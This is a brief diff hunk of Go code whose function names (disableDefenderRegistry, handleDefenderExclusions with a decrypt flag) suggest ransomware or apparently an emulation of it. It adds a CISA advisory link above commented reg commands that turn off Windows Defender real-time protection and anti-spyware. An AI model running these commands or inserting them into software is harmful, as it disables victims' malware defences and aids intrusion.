@@ -27,6 +27,7 @@ func handleDefenderExclusions(isDecrypting bool) {
 }
 
 func disableDefenderRegistry() {
+	// https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 	// reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
